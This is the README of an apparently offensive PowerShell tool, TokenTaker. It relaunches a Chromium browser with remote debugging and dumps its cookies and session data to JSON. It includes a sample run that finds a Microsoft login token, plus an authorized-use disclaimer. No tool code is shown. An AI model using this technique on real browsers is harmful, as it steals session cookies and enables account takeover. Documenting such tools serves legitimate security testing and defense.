# TokenTaker

TokenTaker is a post-exploitation tool that can be used to dump all cookies, session, and local storage entries to json files and it does this through a localhost websocket connection using Chrome/Brave/Edge's remote debug functionality (Chrome DevTools Protocol).

```
PS C:\> .\TokenTaker.ps1
[+] Targeting default browser: brave at C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
[+] Default profile directory: C:\Users\user\AppData\Local\BraveSoftware\Brave-Browser\User Data
[+] Starting brave with default profile and debugging on port 9481...
[+] Found 2 tabs.
[+] Connecting to tab: chrome://newtab/ via ws://127.0.0.1:9481/devtools/page/14C19B86195AE6F889CCF53BBFCED2F6
[+] WebSocket connected.
[+] Dumping it all...
[+] WebSocket closed.
[+] Found token for .login.microsoftonline.com
- Total Cookies: 862
- Total Local storage items: 0
- Total Session storage items: 0
[+] Dumped files saved to C:\Users\user\AppData\Local\Temp\901b7af1-32c7-47c8-a5c0-9f875d0855e1
```

You can read more about it on our blog [here](https://blog.shellntel.com/p/into-the-belly-of-the-beast).

Created by [0rbz_](https://x.com/0rbz_)

---
# Disclaimer

This tool is provided purely for educational purposes and authorized security testing only. It is intended to help users understand web browser security concepts, vulnerabilities, and to help find ways to defend against these sorts of things. Unauthorized use, including but not limited to attacking systems without explicit permission, is strictly prohibited and may violate applicable laws. The developers are not responsible for any misuse, damage, or legal consequences resulting from the use of this tool. Use responsibly and ethically, and always obtain proper consent before testing any system.

